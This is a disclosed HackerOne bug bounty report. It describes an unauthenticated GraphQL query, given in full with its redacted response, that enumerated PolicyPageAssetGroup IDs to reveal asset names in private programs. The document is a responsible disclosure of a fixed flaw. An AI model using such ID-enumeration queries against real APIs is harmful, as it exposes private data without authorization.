# Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}`

## Report Details
- **Report ID**: 1618347
- **URL**: https://hackerone.com/reports/1618347
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-06-28T17:29:11.263Z
- **Disclosed**: 2025-01-21T17:52:54.155Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi team, I understand what's going on
**Description:**
Just a recent update gives the results of private programs
### Steps To Reproduce

Without authorization

GraphQL: 
`{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}`

Answer:
`{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}`

This is Asset program - █████████

Thanks!

## Impact

Disclosing Sсope(Assets) in Private Programs

## Attachments
No attachments
